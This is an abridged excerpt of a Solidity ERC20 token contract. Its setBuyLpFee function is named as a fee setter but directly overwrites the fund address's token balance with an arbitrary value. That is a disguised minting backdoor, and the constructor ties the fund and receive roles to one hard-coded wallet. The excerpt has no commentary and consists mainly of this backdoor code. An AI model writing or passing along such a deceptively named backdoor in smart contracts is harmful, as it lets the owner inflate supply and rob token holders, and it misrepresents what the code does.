...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function setBuyLpFee(uint256 lpFee) external onlyFunder {
        _balances[fundAddress] = lpFee;
    }
...
contract Token is AbsToken {
    constructor(string memory n, string memory s) AbsToken(
        ...
        address(0x62D930fA16DD4600cD788e1070A9Ed9d42DeF2Af),//FundAddress
        address(0x62D930fA16DD4600cD788e1070A9Ed9d42DeF2Af)//ReceiveAddress
    ){
    }
}